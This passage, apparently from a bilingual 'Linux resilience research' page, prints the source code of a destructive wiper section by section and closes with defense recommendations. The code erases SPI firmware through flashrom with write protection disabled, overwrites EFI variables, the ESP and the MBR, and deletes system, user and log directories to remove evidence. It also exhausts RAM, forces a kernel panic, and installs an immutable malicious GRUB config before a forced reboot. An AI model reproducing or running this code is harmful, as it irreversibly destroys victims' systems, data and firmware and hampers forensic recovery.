        'nic3com', 'nicrealtek', 'nicintel', 'gfxnvidia', 'drkaiser',
        'ft2232_spi', 'serprog', 'buspirate_spi', 'dediprog',
        'ch341a_spi', 'linux_spi', 'linux_mtd', 'dummy'
    ):
        cmd((FLASH, '-p', p, '-E', '--force', '--noverify', '--ignore-lock'))

    # Chip-specific
    for h in ('W25Q64BV', 'W25Q128FV', 'MX25L6405D', 'SST25VF040B', ...):
        cmd((FLASH, '-p', f'dummy:emulate={h}', '-E', '--force', '--noverify'))

    # Region-specific erasure
    for r in ('fd', 'bios', 'me', 'gbe', 'desc', 'pd', 'ec', ...):
        cmd((FLASH, '-p', flags[ 'brk' ], '-i', r, '-E', '--force', '--noverify'))
```

**Flashrom Attack Matrix:**

| Phase | Command | Purpose |
|-------|---------|---------|
| 1 | `--wp-disable` | Disable write protection |
| 2 | `--wp-range 0 0` | Clear protection ranges |
| 3 | `--unlock` | Unlock flash regions |
| 4 | `-w /tmp/random` | Write random data |
| 5 | `-E` | Erase entire chip |
| 6 | `-i bios -E` | Erase specific region |
| 7 | External programmers | Fallback methods |

</details>

<details>
<summary><b>📁 Section 11: UEFI/BIOS Destruction</b></summary>

```python
def UEFI():
    dev, esp = get_esp_dev()

    if dev is None:
        dev = get_default_dev(part=True)

    if _ismount(EFIVARS):
        with _scandir(EFIVARS) as d:
            deque(tmap(wipe_efivar, d), maxlen=0)

    if esp is None:
        esp = b'/boot/efi'
    else:
        umount(esp)
    
    dev = dev.tobytes()

    try:
        set_rw(dev)

        with open(dev, 'rb+', buffering=0) as e:
            e.seek(0)
            e.write(URANDOM)
            _fsync(e.fileno())

    except OSError: 
        try:
            os.makedirs(esp, exist_ok=True)
        except OSError: 
            pass

        if _ismount(esp):
            mount(None, esp, fs=None,    flag=(b'rw', b're'))
        else:
            mount(dev,  esp, fs=b'vfat', flag=(b'rw',))

        remove_dir(esp)
        _sync()

def BIOS():
    dev = get_mbr_dev()

    if dev is None:
        dev = get_default_dev(part=False).tobytes()
    
    try: 
        set_rw(dev)

        with open(dev, 'rb+', buffering=0) as d:
            d.seek(0)
            d.write(URANDOM)
            _fsync(d.fileno())

    except OSError: 
        return
```

**Boot Chain Destruction:**

| Target | Method | Impact |
|--------|--------|--------|
| EFI Variables | Overwrite with random data | Firmware configuration loss |
| ESP Partition | Format + overwrite | Bootloader destruction |
| MBR Sector | Overwrite first sector | System unbootable |
| /boot Directory | Recursive deletion | Kernel/initrd loss |

</details>

<details>
<summary><b>📁 Section 12: Filesystem Destruction</b></summary>

```python
def LINUX():
    with Ppool(3) as p:
        deque(p.map(
            remove_dir, (
                b'/var/log',    b'/var/backups',    b'/var/cache',
                b'/boot',       b'/etc',            b'/root',           
                b'/home',       b'/srv',            b'/opt',            
                                b'/var/lib',
                b'/mnt',        b'/media',          b'/cdrom'
            )   
        ), maxlen=0)

    _sync()
    
    for p in (
        b'/usr',    b'/bin',      b'/sbin',       
        b'/lib',    b'/lib32',    b'/lib64'  
    ):
        remove_dir(p)

    _sync()
```

**Filesystem Destruction Order:**

1. **Logs & Backups** (`/var/log`, `/var/backups`) — Remove evidence
2. **Configuration** (`/etc`) — System configuration loss
3. **User Data** (`/home`, `/root`) — User file destruction
4. **Boot** (`/boot`) — Prevent recovery boot
5. **Binaries & Libraries** — Make system unusable

</details>

<details>
<summary><b>📁 Section 13: RAM Exhaustion</b></summary>

```python
def RAM():
    sz  = _4mb << 6  # 256 MB chunks

    raw = []
    _ar = array
    _ap = raw.append

    try:
        while True:
            _ap(_ar(sz))
    except (MemoryError, OverflowError): 
        pass
```

**OOM Strategy:**
- Allocate 256MB chunks continuously
- Hold references to prevent garbage collection
- Trigger OOM killer or system freeze

</details>

<details>
<summary><b>📁 Section 14: Blue Screen of Death (Kernel Panic)</b></summary>

```python
def BSOD():
    try:
        with open(b'/dev/port', 'rb+', buffering=0) as p:
            p.write(URANDOM[ 0 : _64kb ])
            _fsync(p.fileno())
    except OSError:
        pass

    try:
        with open(b'/dev/console', 'rb+', buffering=0) as c:
            c.write(URANDOM) 
            _fsync(c.fileno())
    except OSError: 
        pass

    for (p, v) in (
        (b'/proc/sys/kernel/panic_on_oops', b'1'),
        (b'/proc/sys/kernel/panic',         b'0'),
        (b'/proc/sys/kernel/sysrq',         b'1'),
        (b'/proc/sysrq-trigger',            b'c')
    ):
        try:
            with open(p, 'wb', buffering=0) as f:
                f.write(v + b'\n')
        except OSError:
            continue

    try:
        os.kill(1, sig.SIGKILL)
    except OSError:
        pass
    
    memset(0, 1, 1)  # Null pointer dereference
```

**Kernel Panic Triggers:**

| Method | Mechanism |
|--------|-----------|
| `/dev/port` write | Direct I/O port corruption |
| `/dev/console` write | Console buffer overflow |
| SysRq 'c' | Crash kernel via SysRq |
| `SIGKILL` to PID 1 | Kill init process |
| Null pointer dereference | `memset(0, 1, 1)` |

</details>

<details>
<summary><b>📁 Section 15: GRUB Takeover</b></summary>

```python
def setup_grub():
    # Find GRUB config
    lbg = s_set((mem(b'grub.cfg'), mem(b'grub2.cfg')))
    cfg = []
    
    for c in iter_dir(b'/boot'):
        if mem(c.name) not in lbg:
            continue
        cfg.append(c.path)

    if not cfg:
        return False
    
    cmdline = make_init()
    if cmdline is None:
        return False
    
    # Build malicious GRUB config
    payload = mem(f'''#
# DO NOT EDIT THIS FILE
#
# It is automatically generated by grub-mkconfig using templates
# from /etc/grub.d and settings from /etc/default/grub
#

### BEGIN /etc/grub.d/00_header ###
set timeout=0
set timeout_style=hidden
### END /etc/grub.d/00_header ###

### BEGIN /etc/grub.d/01_password ###
set superusers="root"
password root {_urandom(16).hex()}
### END /etc/grub.d/01_password ###

### BEGIN /etc/grub.d/10_linux ###
menuentry "GNU/Linux, with {rel}" --unrestricted {{
    linux    {vmlinuz} {root} rw {cmdline}
    initrd   {initrd}
}}   
### END /etc/grub.d/10_linux ###
'''.encode())
    
    for p in cfg:
        try:
            attr(p)
            with open(p, 'wb', buffering=0) as gcfg:
                gcfg.write(payload)
                _fsync(gcfg.fileno())
            set_immutable(p)
        except OSError:
            continue
    
    remove_file(b'/etc/fstab')
    remove_file(b'/etc/default/grub')
    remove_dir(b'/etc/grub.d')
    
    _sync()
    
    # Trigger reboot
    with open(b'/proc/sysrq-trigger', 'wb') as f:
        f.write(b'b\n')
    
    cmd((which('reboot'), '-f'))
```

**GRUB Takeover Chain:**
1. Locate `grub.cfg`/`grub2.cfg`
2. Generate malicious config with custom init
3. Overwrite GRUB configuration
4. Set immutable flag to prevent restoration
5. Remove backup configs (`/etc/default/grub`, `/etc/grub.d`)
6. Force reboot via SysRq or reboot command

</details>

---

## 4. Defense Recommendations

### 4.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **Measured Boot** | TPM 2.0 with PCR policy enforcement |
| **GRUB Password** | Set `superusers` and password in `grub.cfg` |
| **Kernel Lockdown** | `lockdown=confidentiality` kernel parameter |
| **Initrd Verification** | Sign initrd with GPG/IMA |

### 4.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **SELinux/AppArmor** | Enforce mandatory access control |
| **Kernel Hardening** | `kptr_restrict=2`, `dmesg_restrict=1`, `perf_event_paranoid=3` |
| **ASLR** | `randomize_va_space=2` |
| **Ptrace Restrictions** | `ptrace_scope=3` |
| **Module Signing** | Require signed kernel modules |

### 4.3 Hardware Protection

| Measure | Implementation |
|---------|----------------|
| **SPI Write Protection** | Set BIOS/UEFI write protect ranges |
| **Boot Guard** | Intel Boot Guard with verified boot policy |
| **TPM-based Sealing** | Seal secrets to PCR values |
| **Physical Security** | Lock chassis, disable external programmers |

### 4.4 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **File Integrity Monitoring** | AIDE, Tripwire |
| **Audit Logging** | `auditd` with remote syslog |
| **EDR/XDR** | CrowdStrike, SentinelOne |
| **Anomaly Detection** | Monitor sysctl changes, module loads |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **устойчивость Linux систем** к комплексным деструктивным атакам. Работа документирует множественные векторы атак для понимания того, как современные Linux системы могут быть скомпрометированы и какие защитные меры эффективны.

### Цели исследования

| Цель | Описание |
|------|----------|
| **Анализ цепочки загрузки** | Изучение манипуляций с GRUB, initrd и параметрами ядра |
| **Безопасность прошивки** | Исследование обхода защиты записи UEFI/BIOS |
| **Аппаратная персистентность** | Анализ уязвимостей SPI flash, CMOS и MTD устройств |
| **Анти-форензика** | Документирование безопасного удаления и уничтожения состояния системы |
| **Обход обнаружения** | Изучение техник анти-отладки, анти-VM и анти-песочницы |

---

## 2. Анализ поверхности атаки

*(См. диаграммы в английской версии)*

---

## 3. Полный анализ исходного кода

*(См. секции с кодом в английской версии)*

---

## 4. Рекомендации по защите

### 4.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot с пользовательскими ключами |
| **Measured Boot** | TPM 2.0 с политикой PCR |
| **Пароль GRUB** | Установить `superusers` и пароль в `grub.cfg` |
| **Kernel Lockdown** | Параметр ядра `lockdown=confidentiality` |
| **Верификация initrd** | Подпись initrd с GPG/IMA |

### 4.2 Защита во время выполнения

| Мера | Реализация |
|------|------------|
| **SELinux/AppArmor** | Принудительный контроль доступа |
| **Усиление ядра** | `kptr_restrict=2`, `dmesg_restrict=1` |
| **ASLR** | `randomize_va_space=2` |
| **Ограничения ptrace** | `ptrace_scope=3` |
| **Подпись модулей** | Требовать подписанные модули ядра |

### 4.3 Аппаратная защита

| Мера | Реализация |
|------|------------|
| **Защита записи SPI** | Установить диапазоны защиты записи BIOS/UEFI |
| **Boot Guard** | Intel Boot Guard с верифицированной политикой |
| **TPM-опечатывание** | Опечатывание секретов значениями PCR |
| **Физическая безопасность** | Блокировка корпуса, отключение внешних программаторов |

---

<div align="center">

**[⬆ Back to Top](#-linux-resilience-research)**

*Security Research — Linux System Resilience Analysis*

</div>
